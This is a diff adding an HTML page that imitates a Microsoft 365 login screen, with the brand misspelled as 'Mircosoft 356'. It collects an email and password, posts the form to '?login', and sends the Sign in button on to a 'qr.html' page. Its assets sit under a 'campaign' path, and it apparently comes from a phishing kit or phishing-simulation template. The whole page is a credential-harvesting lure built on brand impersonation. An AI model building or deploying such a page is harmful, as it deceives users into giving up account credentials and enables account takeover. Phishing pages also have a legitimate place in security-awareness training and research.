@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8" />
+    <title>Login</title>
+    <style type="text/css">*
+{
+    margin:0; padding:0;
+}
+ 
+html,body
+{
+    height:100%;
+    margin:0;
+    width:100%;
+}
+ 
+div.container
+{
+    height:100%;
+    width:100%;
+    background:url(/public/campaign/55/73/11/heroillustration.jpg) no-repeat;
+    background-size:cover;
+}
+ 
+div.wrapper
+{
+    height:100%; width:100%;
+    margin:0 auto;
+}
+ 
+div.frm
+{
+    position:relative;
+    width:500px;
+    height:100%;
+    overflow-y:auto;
+    float:right;
+    background:#fff;
+}
+ 
+div.frm_wrap
+{
+    position:relative;
+    padding:30px 41px;
+}
+ 
+div.frm_wrap form { position:relative; }
+ 
+div.clear { clear:both; }
+ 
+div.txt1
+{
+    font-size:14.4px;
+    font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif;
+    padding:20px 0 30px 0;
+}
+ 
+div.inp
+{
+    padding-bottom:8px;
+}
+ 
+div.inp input
+{
+    width:342px;
+    padding:3px;
+    font-size:14.4px;
+    font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif;
+    border: 1px solid #b8b8b8;
+    background: transparent;
+    color: #000;
+    outline:none;
+}
+div.inp input:focus { border-color:#6b6b6b; }
+ 
+div.inp1
+{
+    padding:23px 0 10px 0;
+}
+ 
+div.inp2 { padding:20px 0 0 0; }
+ 
+div.inp2 button
+{
+    padding:23px 0 10px 0;
+    background:#2672ec;
+    border: 1px solid #fff;
+    padding: 6px 12px 6px 12px;
+    color: #fff;
+    width: auto;
+    transition: background 1s;
+    -moz-transition: background 1s;
+    -webkit-transition: background 1s;
+    -o-transition: background 1s;
+    transition-property: background;
+    transition-duration: 1s;
+    display: inline-block;
+    font-size:14.4px;
+    font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif;
+}
+ 
+div.inp2 button:active { background:#212121;color:#fff; }
+div.inp2 button:hover { background:#a9c3ec; }
+ 
+div.txt2
+{
+    padding-top:30px;
+    padding-bottom:23px;
+}
+ 
+div.bot
+{
+    padding-left:41px;
+}
+ 
+div.txt3
+{
+    color:#767676;
+    font-size:12px;
+    font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif;
+}
+div.txt3 span { display:inline-block; vertical-align:top; }
+div.txt3 span.t { margin-top:4px; padding-right:146px; }
+ 
+a
+{
+    text-decoration:none;
+    color: #2872dd;
+    font-size:14.4px;
+    font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif;
+}
+ 
+div.txt4
+{
+    line-height:26px;
+}
+    </style>
+</head>
+<body style="display: block;">
+<div class="container">
+<div class="wrapper">
+<div class="frm">
+<div class="frm_wrap">
+<form action="?login" method="post">
+<div class="logo"><img alt="Investment Analyst Intern - WestBridge Capital | Keller Center at ..." height="16" src="https://th.bing.com/th/id/OIP.qchsZda_xh3wUfsJ8SQXTAHaA0?rs=1&amp;pid=ImgDetMain" style="height: 16px; width: 150px;" width="150" /></div>
+ 
+<div class="txt1">Welcome to your new &quot;Mircosoft 356 Account&quot;</div>
+ 
+<div class="inp"><input name="login" placeholder="Email or phone" type="email" /></div>
+ 
+<div class="inp"><input name="password" placeholder="Password" type="password" /></div>
+ 
+<div class="inp1"><label><input type="checkbox" value="0" /> <span style="font-size: 11px;"><span style="font-family: arial,helvetica,sans-serif;">Keep me signed in</span></span></label></div>
+ 
+<div class="inp2"><button type="button" onclick="location.href='qr.html'">Sign in</button>
+ 
+<div class="txt2"><span style="font-size: 10px;"><span style="font-family: arial,helvetica,sans-serif;"><a href="#">Can&#39;t access your account?</a></span></span></div>
+</form>
+</div>
+ 
+<div class="bot" id="bot">
+<div class="txt3"><span class="t">&copy; 2017 Mircosoft</span> <span class="i"><img src="/public/campaign/55/73/11/mircosoft.png" /></span></div>
+ 
+<div class="txt4"><a href="#">Terms of use</a> <a href="#">&nbsp;&nbsp;&nbsp;Privacy &amp; Cookies</a></div>
+</div>
+</div>
+ 
+<div class="clear"></div>
+</div>
+</div>
+<script src="/public/campaign/55/73/11/jquery-1.11.3.min.js"></script><script>
+resize();
+$(window).resize(function() { resize(); });
+ 
+function resize()
+{
+    var cy = $('div.frm').height();
+    if(cy > 440)
+    {
+        $('#bot').css({ 'position':'absolute', 'bottom':0 });
+    }
+    else
+    {
+        $('#bot').css({ 'position':'relative', 'bottom':'auto' });
+    }
+console.log($('div.frm').height());
+}
+</script>
+</body>
+</html>
